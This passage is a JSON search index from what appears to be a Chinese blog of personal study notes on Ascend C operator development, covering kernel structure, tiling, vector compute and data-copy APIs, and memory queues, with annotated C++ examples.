[{"title":"Ascend 学习笔记 01 - 基本结构","url":"/Ascend/01%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/","content":"<p>Ascend.</p>\n<span id=\"more\"></span>\n<h1 id=\"kernel-侧实现\">Kernel 侧实现</h1>\n<h2 id=\"init\">1. Init</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Init</span><span class=\"params\">(GM_ADDR x, GM_ADDR y, GM_ADDR z, <span class=\"type\">uint32_t</span> totalLength, <span class=\"type\">uint32_t</span> tileNum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;blockLength = totalLength / AscendC::<span class=\"built_in\">GetBlockNum</span>(); </span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;tileNum = tileNum;    </span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;tileLength = <span class=\"keyword\">this</span>-&gt;blockLength / tileNum / BUFFER_NUM;</span><br><span class=\"line\"></span><br><span class=\"line\">    xGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ DTYPE_X *)x + <span class=\"keyword\">this</span>-&gt;blockLength * AscendC::<span class=\"built_in\">GetBlockIdx</span>(), <span class=\"keyword\">this</span>-&gt;blockLength);</span><br><span class=\"line\">    yGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ DTYPE_Y *)y + <span class=\"keyword\">this</span>-&gt;blockLength * AscendC::<span class=\"built_in\">GetBlockIdx</span>(), <span class=\"keyword\">this</span>-&gt;blockLength);</span><br><span class=\"line\">    zGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ DTYPE_Z *)z + <span class=\"keyword\">this</span>-&gt;blockLength * AscendC::<span class=\"built_in\">GetBlockIdx</span>(), <span class=\"keyword\">this</span>-&gt;blockLength);</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(inQueueX, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileLength * <span class=\"built_in\">sizeof</span>(DTYPE_X));</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(inQueueY, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileLength * <span class=\"built_in\">sizeof</span>(DTYPE_Y));</span><br><span class=\"line\">    pipe.<span class=\"built_in\">InitBuffer</span>(outQueueZ, BUFFER_NUM, <span class=\"keyword\">this</span>-&gt;tileLength * <span class=\"built_in\">sizeof</span>(DTYPE_Z));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    AscendC::TPipe pipe;</span><br><span class=\"line\">    AscendC::TQue&lt;AscendC::QuePosition::VECIN, BUFFER_NUM&gt; inQueueX, inQueueY;</span><br><span class=\"line\">    AscendC::TQue&lt;AscendC::QuePosition::VECOUT, BUFFER_NUM&gt; outQueueZ;</span><br><span class=\"line\">    AscendC::GlobalTensor&lt;DTYPE_X&gt; xGm;</span><br><span class=\"line\">    AscendC::GlobalTensor&lt;DTYPE_Y&gt; yGm;</span><br><span class=\"line\">    AscendC::GlobalTensor&lt;DTYPE_Z&gt; zGm;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>GM_ADDR</code> : 参数在 Global Memory\n的内存地址，通常是一个连续的区域（？）</li>\n<li><code>totalLength</code> : 数据总体长度，即有一个 x 。</li>\n<li><code>tileNum</code> : 分片数量，totalLength\n长度的数据，分成几片送入 NPU。</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">this</span>-&gt;blockLength = totalLength / AscendC::<span class=\"built_in\">GetBlockNum</span>(); </span><br><span class=\"line\"><span class=\"comment\">// 例如：总共有 1024单位 的数据 totalLength = 1024, 总共有2个AICore核心，每个核心处理512个长度的数据。即每块要处理多长的数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">this</span>-&gt;tileNum = tileNum; <span class=\"comment\">// 每一个AICore，总共要送进去多少次数据，即要送入多少个 tile</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">this</span>-&gt;tileLength = <span class=\"keyword\">this</span>-&gt;blockLength / tileNum / BUFFER_NUM;</span><br><span class=\"line\"><span class=\"comment\">// 每次送入缓冲区的数据长度。本来应该 tile数量 * 每tile数据长度 = 总Block数据长度，</span></span><br><span class=\"line\"><span class=\"comment\">// 但是用了double buffer策略，加速送入缓冲区的效率.</span></span><br><span class=\"line\"><span class=\"comment\">// 例如，每个核心需要送入 512单位 的数据，分成128次送，每次只用送入 4 个单位的数据。</span></span><br><span class=\"line\"><span class=\"comment\">// 再由于 double buffer，每次只用送入 2个单位，在这两个单位进行运算的时候，送入另外2个单位</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><code>AscendC::GlobalTensor&lt;T&gt;</code> ：用来存放\nGlobalMemory 中的数据。</p>\n<figure>\n<img src=\"/Ascend/01%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/image-20250322201209706.png\" alt=\"image-20250322201209706\">\n<figcaption aria-hidden=\"true\">image-20250322201209706</figcaption>\n</figure>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">xGm.<span class=\"built_in\">SetGlobalBuffer</span>((__gm__ DTYPE_X *)x + <span class=\"keyword\">this</span>-&gt;blockLength * AscendC::<span class=\"built_in\">GetBlockIdx</span>(), <span class=\"keyword\">this</span>-&gt;blockLength);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// (__gm__ DTYPE_X *)x 把 x 转换成 __gm__ DTYPE 类型的指针</span></span><br><span class=\"line\"><span class=\"comment\">// x + this-&gt;blockLength * GetBlockIdx()，第i块核心的数据索引开头的指针</span></span><br><span class=\"line\"><span class=\"comment\">// this-&gt;blockLength 这一块的长度</span></span><br></pre></td></tr></table></figure></p></li>\n<li><p><code>pipe.InitBuffer(inQueueX, BUFFER_NUM, this-&gt;tileLength * sizeof(DTYPE_X));</code>\n：初始化管道</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// inQueueX 管道对象</span></span><br><span class=\"line\"><span class=\"comment\">// BUFFER_NUM，几个缓冲区</span></span><br><span class=\"line\"><span class=\"comment\">// 管道总大小：this-&gt;tileLength * sizeof(DTYPE_X) ，管道一次只能塞满一个tile的数据，总共有 tileLength 个数据，每个数据 sizeof(DTYPE_X) 字节</span></span><br></pre></td></tr></table></figure></p>\n<p><code>InitBuffer</code> 完成后，<code>inQueueX</code>\n内还是空的。<code>inQueueX</code> 要保存的数据在 localTensor\n里。</p></li>\n</ul>\n<h2 id=\"process\">2. Process</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Process</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"type\">int32_t</span> loopCount = <span class=\"keyword\">this</span>-&gt;tileNum * BUFFER_NUM; </span><br><span class=\"line\">    <span class=\"comment\">// 循环次数，tile数量，每个tile本来应该就是一次操作，但是double buffer了，本来的一次操作拆成了两次，每次操作的大小为原来的一半。</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int32_t</span> i = <span class=\"number\">0</span>; i &lt; loopCount; i++) {</span><br><span class=\"line\">        <span class=\"built_in\">CopyIn</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">Compute</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">CopyOut</span>(i);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"copyin\">3. CopyIn</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">CopyIn</span><span class=\"params\">(<span class=\"type\">int32_t</span> progress)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_X&gt; xLocal = inQueueX.<span class=\"built_in\">AllocTensor</span>&lt;DTYPE_X&gt;();</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_Y&gt; yLocal = inQueueY.<span class=\"built_in\">AllocTensor</span>&lt;DTYPE_Y&gt;();</span><br><span class=\"line\">    AscendC::<span class=\"built_in\">DataCopy</span>(xLocal, xGm[progress * <span class=\"keyword\">this</span>-&gt;tileLength], <span class=\"keyword\">this</span>-&gt;tileLength);</span><br><span class=\"line\">    AscendC::<span class=\"built_in\">DataCopy</span>(yLocal, yGm[progress * <span class=\"keyword\">this</span>-&gt;tileLength], <span class=\"keyword\">this</span>-&gt;tileLength);</span><br><span class=\"line\">    inQueueX.<span class=\"built_in\">EnQue</span>(xLocal);</span><br><span class=\"line\">    inQueueY.<span class=\"built_in\">EnQue</span>(yLocal);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p><code>progress</code> : 核心的编号。</p></li>\n<li><p><code>LocalTensor&lt;T&gt;</code> : AICore 中的数据区域。</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">AscendC::LocalTensor&lt;DTYPE_X&gt; xLocal = inQueueX.<span class=\"built_in\">AllocTensor</span>&lt;DTYPE_X&gt;();</span><br><span class=\"line\"><span class=\"comment\">// 动态分配空间，在AIcore内部分配一个空间，长度刚好一个tileLength</span></span><br><span class=\"line\"><span class=\"comment\">// inQueueX知道 tileLength 是多少，分配出来的</span></span><br></pre></td></tr></table></figure></p></li>\n<li><p><code>DataCopy</code></p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">AscendC::<span class=\"built_in\">DataCopy</span>(xLocal, xGm[progress * <span class=\"keyword\">this</span>-&gt;tileLength], <span class=\"keyword\">this</span>-&gt;tileLength);</span><br><span class=\"line\"><span class=\"comment\">// 从xGm第progress个块的起始位置开始，复制 tileLength 长度的数据，存入 xLocal</span></span><br></pre></td></tr></table></figure></p></li>\n<li><p><code>inQueueX.EnQue</code></p>\n<p>队列里塞进去刚刚分配的 xLocal 。应该存的是一个指针。</p></li>\n</ul>\n<p>概述一下：</p>\n<ol type=\"1\">\n<li>分配了一个<strong>内核中的内存空间</strong></li>\n<li>把 GlobalMemory 中的数据拷贝进这段<strong>内核内存空间</strong></li>\n<li>TQue中记录这个内存空间的指针</li>\n</ol>\n<p>分配了一个内核空间存放外部数据，记录在TQue里，之后需要释放。</p>\n<h2 id=\"compute\">4. Compute</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Compute</span><span class=\"params\">(<span class=\"type\">int32_t</span> progress)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_X&gt; xLocal = inQueueX.<span class=\"built_in\">DeQue</span>&lt;DTYPE_X&gt;();</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_Y&gt; yLocal = inQueueY.<span class=\"built_in\">DeQue</span>&lt;DTYPE_Y&gt;();</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_Z&gt; zLocal = outQueueZ.<span class=\"built_in\">AllocTensor</span>&lt;DTYPE_Z&gt;();</span><br><span class=\"line\">    AscendC::<span class=\"built_in\">Add</span>(zLocal, xLocal, yLocal, <span class=\"keyword\">this</span>-&gt;tileLength);</span><br><span class=\"line\">    outQueueZ.<span class=\"built_in\">EnQue</span>&lt;DTYPE_Z&gt;(zLocal);</span><br><span class=\"line\">    inQueueX.<span class=\"built_in\">FreeTensor</span>(xLocal);</span><br><span class=\"line\">    inQueueY.<span class=\"built_in\">FreeTensor</span>(yLocal);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>从队列中取出单块的数据指针。</p>\n<p>进行运算。调用 Ascend::Add 这是一个基础的矢量计算。</p>\n<p>要记得，xLocal中的数据总共有 tileLength 个，每个是 half 。</p>\n<p>计算完成后，释放 xLocal 的空间。</p>\n<p>同时分配输出的 zLocal 空间，放入 outQueueZ 中。</p>\n<p>标量双目运算符，可以在向量和标量直接运算，命名为 XXXs。例如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">half a=<span class=\"number\">-1</span></span><br><span class=\"line\"><span class=\"built_in\">Muls</span>(xLocal, xLocal, a, <span class=\"keyword\">this</span>-&gt;tileLength);</span><br></pre></td></tr></table></figure>\n<p>就是给xLocal全部取负。</p>\n<h2 id=\"copyout\">5. CopyOut</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">CopyOut</span><span class=\"params\">(<span class=\"type\">int32_t</span> progress)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    AscendC::LocalTensor&lt;DTYPE_Z&gt; zLocal = outQueueZ.<span class=\"built_in\">DeQue</span>&lt;DTYPE_Z&gt;();</span><br><span class=\"line\">    AscendC::<span class=\"built_in\">DataCopy</span>(zGm[progress * <span class=\"keyword\">this</span>-&gt;tileLength], zLocal, <span class=\"keyword\">this</span>-&gt;tileLength);</span><br><span class=\"line\">    outQueueZ.<span class=\"built_in\">FreeTensor</span>(zLocal);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>取出结果，拷贝回 Global Memory。</p>\n<p>释放 zLocal。</p>\n<h1 id=\"host-侧实现\">Host 侧实现</h1>\n<h2 id=\"tiling结构体\">1. Tiling结构体</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> optiling {</span><br><span class=\"line\"><span class=\"built_in\">BEGIN_TILING_DATA_DEF</span>(TilingData)</span><br><span class=\"line\"><span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, totalLength); <span class=\"comment\">// 两个参数，totalLength</span></span><br><span class=\"line\"><span class=\"built_in\">TILING_DATA_FIELD_DEF</span>(<span class=\"type\">uint32_t</span>, tileNum); <span class=\"comment\">// tileNum</span></span><br><span class=\"line\">END_TILING_DATA_DEF;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">REGISTER_TILING_DATA_CLASS</span>(AddCustom, TilingData)</span><br><span class=\"line\">} <span class=\"comment\">// namespace optiling</span></span><br></pre></td></tr></table></figure>\n<p>就是核函数的构造参数。内部数据可以自己定。</p>\n<p>还不明白 tiling 可以怎么设计优化。</p>\n<h2 id=\"tilingfunc\">2. TilingFunc</h2>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> optiling {</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> BLOCK_DIM = <span class=\"number\">8</span>;  <span class=\"comment\">// 几个核心</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">uint32_t</span> TILE_NUM = <span class=\"number\">8</span>;   <span class=\"comment\">// 拆分几次送进</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> ge::graphStatus <span class=\"title\">TilingFunc</span><span class=\"params\">(gert::TilingContext *context)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    TilingData tiling; </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> totalLength = context-&gt;<span class=\"built_in\">GetInputShape</span>(<span class=\"number\">0</span>)-&gt;<span class=\"built_in\">GetOriginShape</span>().<span class=\"built_in\">GetShapeSize</span>(); <span class=\"comment\">// 获取第0个Input的Shape，获取原始形状，获取形状</span></span><br><span class=\"line\">    context-&gt;<span class=\"built_in\">SetBlockDim</span>(BLOCK_DIM); <span class=\"comment\">// 设置核心数量</span></span><br><span class=\"line\">    tiling.<span class=\"built_in\">set_totalLength</span>(totalLength); <span class=\"comment\">// 给tiling设置总长度</span></span><br><span class=\"line\">    tiling.<span class=\"built_in\">set_tileNum</span>(TILE_NUM); <span class=\"comment\">// 设置tiling数量</span></span><br><span class=\"line\">    tiling.<span class=\"built_in\">SaveToBuffer</span>(context-&gt;<span class=\"built_in\">GetRawTilingData</span>()-&gt;<span class=\"built_in\">GetData</span>(), context-&gt;<span class=\"built_in\">GetRawTilingData</span>()-&gt;<span class=\"built_in\">GetCapacity</span>()); </span><br><span class=\"line\">    <span class=\"comment\">// 把context里的原始数据保存到buffer里。context-&gt;GetRawTilingData()，有data和capacity。</span></span><br><span class=\"line\">    context-&gt;<span class=\"built_in\">GetRawTilingData</span>()-&gt;<span class=\"built_in\">SetDataSize</span>(tiling.<span class=\"built_in\">GetDataSize</span>()); </span><br><span class=\"line\">    <span class=\"comment\">// 设置dataSize。capacity和datasize有什么区别？ capacity是最大容量，datasize是数据大小。</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> *currentWorkspace = context-&gt;<span class=\"built_in\">GetWorkspaceSizes</span>(<span class=\"number\">1</span>); <span class=\"comment\">// 设置WorkSpace，不懂</span></span><br><span class=\"line\">    currentWorkspace[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ge::GRAPH_SUCCESS;</span><br><span class=\"line\">}</span><br><span class=\"line\">    </span><br><span class=\"line\">} <span class=\"comment\">// namespace optiling</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>gert::TilingContext *context</code> Tiling\n上下文，Tiling结构体就保存在这个上下文里，还有输入的Tensor数据也在</li>\n</ul>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"Ascend 学习笔记 02 - API","url":"/Ascend/02API/","content":"<p>参考教程视频：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUtINHkxYzdXdD92ZF9zb3VyY2U9ZTdlY2NhMjdmMDlmNzE4NjljNDlhMjIyMDY4OTFhMzA=\">Ascend\nC算子开发中级教程——API通用解读<i class=\"fa fa-external-link-alt\"></i></span></p>\n<span id=\"more\"></span>\n<h1 id=\"计算api\">1 计算API</h1>\n<ol type=\"1\">\n<li>整个Tensor参与计算。有运算符重载了。</li>\n<li>Tensor 前 n 个数据计算。<code>Add(dst, src1, src2, n)</code></li>\n<li>Tensor\n高维切分计算。（不是前n个数，是任意哪些位置需要进行计算）</li>\n</ol>\n<h2 id=\"高维切分计算\">1.1 高维切分计算</h2>\n<ul>\n<li>Repeat times (迭代次数)</li>\n<li>Repeat stride (相邻迭代间相同block的地址步长)</li>\n<li>Block stride (单词迭代内不同block间的地址步长)</li>\n<li>Mask (用于控制参与运算的计算单元)</li>\n</ul>\n<h3 id=\"repeat-times\">1.1.1 Repeat times</h3>\n<p>下面的block不是之前算子调用的block，<strong>一个block特指32B数据</strong></p>\n<p><strong>重点：矢量计算单元的一个指令周期可以算256B数据，即每次计算8个block</strong></p>\n<p>AIcore内部是SIMD。单指令多数据流。调用一次指令，可以重复进行多次计算。每次算\n8 个 block 。</p>\n<p>总共算几次呢？repeat times。</p>\n<p><strong>repeat times 存在一个 8 位的寄存器里，所以不能超过\n255。</strong></p>\n<p>例如要计算 512B 的数据，<code>512B = 256B * 2</code>， 所以 repeat\ntimes = 2. 表示总共要计算 16个 block，共计256B。</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323202742600.png\" alt=\"image-20250323202742600\">\n<figcaption aria-hidden=\"true\">image-20250323202742600</figcaption>\n</figure>\n<h3 id=\"repeat-stride\">1.1.2 Repeat Stride</h3>\n<p>这就好理解了。每次 repeat\n是一次迭代，两次迭代之间要间隔多少就是步长。</p>\n<ul>\n<li><p>连续计算：stride = 8，因为每次算 8 block，间隔 8 个\nblock重复一次就是连续计算。</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323203243169.png\" alt=\"image-20250323203243169\">\n<figcaption aria-hidden=\"true\">image-20250323203243169</figcaption>\n</figure></li>\n<li><p>非连续计算：例如 stride = 10，每次中间会空两个 block 不计算。</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323203309434.png\" alt=\"image-20250323203309434\">\n<figcaption aria-hidden=\"true\">image-20250323203309434</figcaption>\n</figure></li>\n<li><p>反复计算：stride &lt; 8，例如 stride =\n0，就是反复重新计算前8block的数据</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323203339609.png\" alt=\"image-20250323203339609\">\n<figcaption aria-hidden=\"true\">image-20250323203339609</figcaption>\n</figure></li>\n</ul>\n<h3 id=\"block-stride\">1.1.3 Block stride</h3>\n<p>repeat stride 是迭代之间相隔多少，Block stride\n是一个迭代之内相距多少。</p>\n<p>直接上图：</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323203608021.png\" alt=\"image-20250323203608021\">\n<figcaption aria-hidden=\"true\">image-20250323203608021</figcaption>\n</figure>\n<p>对于上图中 block stride = 2\n的情况，跳过的block（2、4、6...）不会在第二次迭代里计算，第二次迭代直接从\n17 开始。</p>\n<p>block stride 也可以取 0，每次迭代重复计算一个元素8次。</p>\n<h3 id=\"mask\">1.1.4 mask</h3>\n<p>上面三个参数最小的控制单位只到\nblock，32B。32B还能存好几个数据（例如16个half，8个f32……）</p>\n<p>这些数据还能更精细的进行计算，用到 mask 参数，每次计算的 256B\n的数据，表示前多少个单位的数据可以参与计算。</p>\n<p>直接看例子：</p>\n<ul>\n<li>连续计算：</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 以int16_t类型为例，每个数字 16b=2B, 每次计算可以算 256B/2B = 128个数字。</span></span><br><span class=\"line\"><span class=\"comment\">// 设置 repeatTimes=1，只迭代一次，即计算8个block，即计算256B的数据，即128个int16_t的数字。</span></span><br><span class=\"line\">src0Local = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,...,<span class=\"number\">64</span>,...,<span class=\"number\">128</span>] <span class=\"comment\">// 共计128个数</span></span><br><span class=\"line\">src1Local = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,...,<span class=\"number\">64</span>,...,<span class=\"number\">128</span>] <span class=\"comment\">// 共计128个数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mask的取值范围在 [1, 每次最多可以计算的数字个数] , 在这个例子中为 [1, 128]</span></span><br><span class=\"line\"><span class=\"comment\">// 我们取mask=64</span></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mask = <span class=\"number\">64</span>; <span class=\"comment\">// 在范围内，合法输入。表示计算前64个数字</span></span><br><span class=\"line\">Add(dstLocal, src0Local, src1Local, </span><br><span class=\"line\">    mask, </span><br><span class=\"line\">    <span class=\"number\">1</span>, <span class=\"comment\">// repeaat times, 只迭代1次</span></span><br><span class=\"line\">    {<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">8</span>} <span class=\"comment\">// {dst,src0,src1的blockstride, dst,src0,src1的repeatstride}</span></span><br><span class=\"line\">   );</span><br><span class=\"line\"></span><br><span class=\"line\">输出结果: dstLocal = [<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,...,<span class=\"number\">128</span>,undefined,undefined,...,undefined]</span><br></pre></td></tr></table></figure>\n<ul>\n<li>逐bit模式：</li>\n</ul>\n<p>可以任意规定，哪些数字可以参与计算。此时 mask 为\n<code>uint64_t mask[]</code> ，具体数组要几个 uint64_t\n视数据类型而定。</p>\n<p>当操作数为 16 位时，每次可以计算 128 个数字，所以要用到\n<code>uint64_t mask[2]</code> 。</p>\n<p>当操作数为 32 位时，每次可以计算 64 个数字，所以要用到\n<code>uint64_t mask[1]</code> 。</p>\n<p>当操作数为 8 位时，每次可以计算 256 个数字，所以要用到\n<code>uint64_t mask[4]</code> 。</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323210148407.png\" alt=\"image-20250323210148407\">\n<figcaption aria-hidden=\"true\">image-20250323210148407</figcaption>\n</figure>\n<h1 id=\"数据搬运api\">2 数据搬运API</h1>\n<p>支持的数据类型：</p>\n<ul>\n<li>GM → A1</li>\n<li>GM → B1</li>\n<li>CO1 → CO2</li>\n<li>CO2 → GM</li>\n<li>GM → VECIN</li>\n<li>VECIN → VECOUT</li>\n<li>VECOUT → GM</li>\n</ul>\n<h2 id=\"普通数据搬运接口\">2.1 普通数据搬运接口</h2>\n<figure>\n<img src=\"/Ascend/02API/image-20250323210912499.png\" alt=\"image-20250323210912499\">\n<figcaption aria-hidden=\"true\">image-20250323210912499</figcaption>\n</figure>\n<p>不连续搬运的 <code>DataCopyParam</code>\n和计算API的<strong>有区别</strong>：</p>\n<figure>\n<img src=\"/Ascend/02API/image-20250323211032915.png\" alt=\"image-20250323211032915\">\n<figcaption aria-hidden=\"true\">image-20250323211032915</figcaption>\n</figure>\n<ul>\n<li>blockCount：每次搬运多少个<strong>大数据块</strong>，一个大数据块有blockLen个block。</li>\n<li>blockLen：每个大数据块里有多少个<strong>小数据块</strong>，一个小数据块即为一个32B的block。</li>\n<li>stride：<strong>和计算API不一样</strong>，数据搬运是是“<strong>头和尾</strong>”相差多少，计算API是“<strong>头和头</strong>”（看图片）</li>\n</ul>\n<h1 id=\"内存管理api\">3 内存管理API</h1>\n<p>TQue、TBuf、TPipe……</p>\n<p><code>TQue</code> 的 <code>TPosition</code>\n是输入输出的变量，<code>VECIN</code>、<code>VECOUT</code>。</p>\n<p><code>TBuf</code> 的 <code>TPosition</code>\n是中间缓冲变量，<code>VECCALC</code> 。</p>\n<p>所有的 <code>LocalTensor</code> 都得由 <code>TQue</code> 和\n<code>TBuf</code> 创建和释放。<code>AllocTensor</code>\n<code>FreeTensor</code>。</p>\n<p><code>TPipe</code> 用于给 <code>TQue</code> 和 <code>TBuf</code>\n分配内存块，例如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> num = <span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> len = <span class=\"number\">1024</span>;</span><br><span class=\"line\">TPipe = pipe;</span><br><span class=\"line\">TQue&lt;TPosition::VECOUT, <span class=\"number\">2</span>&gt; que;</span><br><span class=\"line\">pip.<span class=\"built_in\">InitBuffer</span>(que, num, len); <span class=\"comment\">// 给 que 分配 4 个内存块，每个内存块1024B的数据</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"任务同步api\">4 任务同步API</h1>\n<p><code>EnQue</code> 和 <code>DeQue</code>.</p>\n<p>可以理解成，一个的 Process\n是一次性启动了所有任务。这些函数本身是异步的。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__aicore__ <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">Process</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> loopCount = <span class=\"keyword\">this</span>-&gt;tileNum * BUFFER_NUM;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int32_t</span> i = <span class=\"number\">0</span>; i &lt; loopCount; i++) {</span><br><span class=\"line\">        <span class=\"built_in\">CopyIn</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">Compute</span>(i);</span><br><span class=\"line\">        <span class=\"built_in\">CopyOut</span>(i);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>但是 Compute 中用了 DeQue ，如果 TQue\n中没有数据，不会执行后续的运算。这样实现的任务同步。</p>\n<h1 id=\"高级api\">5 高级API</h1>\n<p>封装了常用算法，提升开发效率。</p>\n<p>甚至可以直接用 GM 进行计算，搬运操作都封装进去了。</p>\n<p>例如 Sinh\n计算过程中需要用到临时变量（但是按我的原地计算实现，好像没用到临时变量）</p>\n<p>高阶API的Sinh，会自动申请临时空间来保存中间变量。但是每次调用 Sinh\n都会反复申请和释放临时空间。因此开发者可以提供\n<code>sharedTmpBuffer</code> 传入自己申请的空间。</p>\n<p><code>sharedTmpBuffer</code> 需要多大？是典型的 Tiling 信息，需要在\nhost 侧算好，传给 device 。</p>\n<p>对于 Sinh 甚至有 <code>GetSinhMaxMinTmpSize</code>\n可以计算最大、最少需要多少空间。</p>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"Ascend 学习笔记 03 - 非对齐尾块处理（Tiling）","url":"/Ascend/03Tiling/","content":"<p>非对齐尾块处理方式。</p>\n<span id=\"more\"></span>\n<p>之前的例子输入都非常整齐，8x2048的half平分到各个AICore上的很轻松，但是实际情况下不一定这么凑巧。</p>\n<p>算子的输入必须要能刚好对齐到一个 block 32B\n上，如果不刚好需要先进行数据补齐。</p>\n<h1 id=\"流程\">流程</h1>\n<h2 id=\"步骤132字节对齐\">步骤1：32字节对齐</h2>\n<p>计算输入的数据能否被 32B 整除，将数据填充到向上填充到32B。</p>\n<h2 